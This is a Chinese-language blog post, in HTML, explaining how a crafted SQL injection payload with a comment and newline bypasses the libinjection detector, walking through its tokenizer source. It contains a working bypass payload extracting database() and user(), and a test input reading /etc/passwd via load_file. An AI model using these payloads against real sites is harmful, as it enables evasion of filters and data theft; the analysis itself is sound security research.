@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Libinjection 语义分析通用绕过一、漏洞简介二、漏洞影响三、复现过程源码下载地址 https:&#x2F;&#x2F;github.com&#x2F;client9&#x2F;libinjection  example.c  #include &lt;stdio.h&gt; #include &lt;strings.h&gt; #include &lt;errno.h&gt; #include &quot;libinjecti">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Libinjection/Libinjection%20%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E9%80%9A%E7%94%A8%E7%BB%95%E8%BF%87/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Libinjection 语义分析通用绕过一、漏洞简介二、漏洞影响三、复现过程源码下载地址 https:&#x2F;&#x2F;github.com&#x2F;client9&#x2F;libinjection  example.c  #include &lt;stdio.h&gt; #include &lt;strings.h&gt; #include &lt;errno.h&gt; #include &quot;libinjecti">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Libinjection%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E9%80%9A%E7%94%A8%E7%BB%95%E8%BF%87/media/rId24.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Libinjection%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E9%80%9A%E7%94%A8%E7%BB%95%E8%BF%87/media/rId25.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Libinjection%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E9%80%9A%E7%94%A8%E7%BB%95%E8%BF%87/media/rId27.png">
+<meta property="article:published_time" content="2022-07-08T06:25:59.012Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.673Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/Libinjection%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E9%80%9A%E7%94%A8%E7%BB%95%E8%BF%87/media/rId24.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Libinjection/Libinjection 语义分析通用绕过" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Libinjection/Libinjection%20%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E9%80%9A%E7%94%A8%E7%BB%95%E8%BF%87/" class="article-date">
+  <time datetime="2022-07-08T06:25:59.012Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Libinjection-语义分析通用绕过"><a href="#Libinjection-语义分析通用绕过" class="headerlink" title="Libinjection 语义分析通用绕过"></a>Libinjection 语义分析通用绕过</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>源码下载地址 <code>https://github.com/client9/libinjection</code></p>
+<blockquote>
+<p>example.c</p>
+</blockquote>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;strings.h&gt;
+#include &lt;errno.h&gt;
+#include &quot;libinjection.h&quot;
+#include &quot;libinjection_sqli.h&quot;
+
+int main(int argc, const char* argv[])
+&#123;
+    struct libinjection_sqli_state state;
+    int issqli;
+
+    const char* input = argv[1];
+    size_t slen = strlen(input);
+
+    /* in real-world, you would url-decode the input, etc */
+
+    libinjection_sqli_init(&amp;state, input, slen, FLAG_NONE);
+    issqli = libinjection_is_sqli(&amp;state);
+    if (issqli) &#123;
+        fprintf(stderr, &quot;sqli detected with fingerprint of &#39;%s&#39;\n&quot;, state.fingerprint);
+    &#125;
+    return issqli;
+&#125;
+$ gcc -Wall -Wextra examples.c libinjection_sqli.c
+$ ./a.out &quot;-1&#39; and 1=1 union/* foo */select load_file(&#39;/etc/passwd&#39;)--&quot;
+sqli detected with fingerprint of &#39;s&amp;1UE&#39;
+</code></pre>
+<p><strong>首先给一个pyload</strong></p>
+<pre><code># ./bin &quot;ad1n&#39;-- %a%0aunion select 1,database(),user() -- &quot; 
+not sqli 
+#
+</code></pre>
+<p>测试payload 是否OK</p>
+<p><img src="/resource/Libinjection%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E9%80%9A%E7%94%A8%E7%BB%95%E8%BF%87/media/rId24.png" alt="1.png"></p>
+<p>为什么会这样呢???</p>
+<p>首先打开源码吧</p>
+<p>如果对这个语义分析不太了解的吧，可以去百度上可以找到很多分析的文章这里就不过多阐述了</p>
+<p>下图是一个运行的一个流程图</p>
+<p><img src="/resource/Libinjection%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E9%80%9A%E7%94%A8%E7%BB%95%E8%BF%87/media/rId25.png" alt="2.png"></p>
+<h3 id="它内部分为四种模式"><a href="#它内部分为四种模式" class="headerlink" title="它内部分为四种模式"></a>它内部分为四种模式</h3><pre><code>1. 无符号 标准SQL 模式 
+2. 无符号 MySQL模式 
+3. 单引号 标准SQL 模式 
+4. 单引号 MySQL 模式 
+5. 双引号 MySQL 模式
+</code></pre>
+<p>然后上面是一个单引号的标准SQL 的匹配他的一个核心点在于如下 函数libinjection_sqli_tokenize<br>作为一个转换内部字符的一个入口</p>
+<pre><code>int libinjection_sqli_tokenize(struct libinjection_sqli_state * sf)
+&#123;
+    pt2Function fnptr;
+    size_t *pos = &amp;sf-&gt;pos;
+    stoken_t *current = sf-&gt;current;
+    const char *s = sf-&gt;s;
+    const size_t slen = sf-&gt;slen;
+    if (slen == 0) &#123;
+        return FALSE;
+    &#125;
+​
+    //初始化
+    st_clear(current);
+    sf-&gt;current = current;
+​
+    if (*pos == 0 &amp;&amp; (sf-&gt;flags &amp; (FLAG_QUOTE_SINGLE | FLAG_QUOTE_DOUBLE))) &#123;
+        *pos = parse_string_core(s, slen, 0, current, flag2delim(sf-&gt;flags), 0);
+        printf(&quot;单引号双引号进入&quot;);
+        sf-&gt;stats_tokens += 1;
+        return TRUE;
+    &#125;
+​
+    while (*pos &lt; slen) &#123;
+​
+        /*
+         * get current character
+         */
+        const unsigned char ch = (unsigned char) (s[*pos]);
+        /*
+         * look up the parser, and call it
+         *
+         * Porting Note: this is mapping of char to function
+         *   charparsers[ch]()
+         */
+        fnptr = char_parse_map[ch];
+        *pos = (*fnptr) (sf);
+        if (current-&gt;type != CHAR_NULL) &#123;
+            sf-&gt;stats_tokens += 1;
+            return TRUE;
+        &#125;
+    &#125;
+    return FALSE;
+&#125;
+</code></pre>
+<p>为什么<code># &quot;ad1n&#39;-- %a%0aunion select 1,database(),user() -- &quot;</code><br>这么一个简单的可以绕过呢。</p>
+<p>首先他是吧 <code>admi&#39;</code> 先进入无符号的标准SQL 然后发现有一个&#39; 后面就转到<br>单引号的标准SQL</p>
+<p>单引号标准SQL 首先获取的<code>admn&#39;</code> 然后break</p>
+<p>继续到了下一层碰到了一个 - 那么走到parse_dash函数中</p>
+<pre><code>static size_t parse_dash(struct libinjection_sqli_state * sf)
+&#123;
+    const char *cs = sf-&gt;s;
+    const size_t slen = sf-&gt;slen;
+    size_t pos = sf-&gt;pos;
+​
+    if (pos + 2 &lt; slen &amp;&amp; cs[pos + 1] == &#39;-&#39; &amp;&amp; char_is_white(cs[pos+2]) ) &#123;
+        return parse_eol_comment(sf);
+    &#125; else if (pos +2 == slen &amp;&amp; cs[pos + 1] == &#39;-&#39;) &#123;
+        return parse_eol_comment(sf);
+    &#125; else if (pos + 1 &lt; slen &amp;&amp; cs[pos + 1] == &#39;-&#39; &amp;&amp; (sf-&gt;flags &amp; FLAG_SQL_ANSI)) &#123;
+        sf-&gt;stats_comment_ddx += 1;
+        return parse_eol_comment(sf);
+    &#125; else &#123;
+        st_assign_char(sf-&gt;current, TYPE_OPERATOR, pos, 1, &#39;-&#39;);
+        return pos + 1;
+    &#125;
+&#125;
+</code></pre>
+<p>然后当前的pos 一定是符合第一个判断条件的。继续跟踪parse_eol_comment<br>函数</p>
+<pre><code>static size_t parse_eol_comment(struct libinjection_sqli_state * sf)
+&#123;
+    const char *cs = sf-&gt;s;
+    const size_t slen = sf-&gt;slen;
+    size_t pos = sf-&gt;pos;
+    
+    const char *endpos =(const char *) memchr((const void *) (cs + pos), &#39;\n&#39;, slen - pos);
+    if (endpos == NULL) &#123;
+        st_assign(sf-&gt;current, TYPE_COMMENT, pos, slen - pos, cs + pos);
+        return slen;
+    &#125; else &#123;
+        st_assign(sf-&gt;current, TYPE_COMMENT, pos, (size_t)(endpos - cs) - pos, cs + pos);
+        return (size_t)((endpos - cs) + 1);
+    &#125;
+&#125;
+</code></pre>
+<p>这里只是判断了是否是有\n 这个。然后就直接进入到st_assign<br>函数中。继续跟踪st_assign 函数</p>
+<pre><code>static void st_assign(stoken_t * st, const char stype,size_t pos, size_t len, const char* value)
+&#123;
+    const size_t MSIZE = LIBINJECTION_SQLI_TOKEN_SIZE;
+    size_t last = len &lt; MSIZE ? len : (MSIZE - 1);
+    st-&gt;type = (char) stype;
+    st-&gt;pos = pos;
+    st-&gt;len = last;
+    memcpy(st-&gt;val, value, last);
+    st-&gt;val[last] = CHAR_NULL;
+&#125;
+</code></pre>
+<p>当前函数也是只是赋值了一下val然后就可以做任何操作。</p>
+<p>最后就是 <code>admin&#39;</code> 转换成了S</p>
+<p>-- 因为没有查询到直接是C</p>
+<p>最后得到的匹配规则为SC 。此匹配规则不在数据库中。完成了绕过。</p>
+<p>附一张调试打印图</p>
+<p><img src="/resource/Libinjection%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E9%80%9A%E7%94%A8%E7%BB%95%E8%BF%87/media/rId27.png" alt="3.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Libinjection/Libinjection%20%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E9%80%9A%E7%94%A8%E7%BB%95%E8%BF%87/" data-id="cl5c2qrpm00aiy8v1grvrdpdd" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Libssh/%EF%BC%88CVE-2018-10933%EF%BC%89Libssh%20%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%9D%83%E9%99%90%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/LFCMS/LFCMS%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
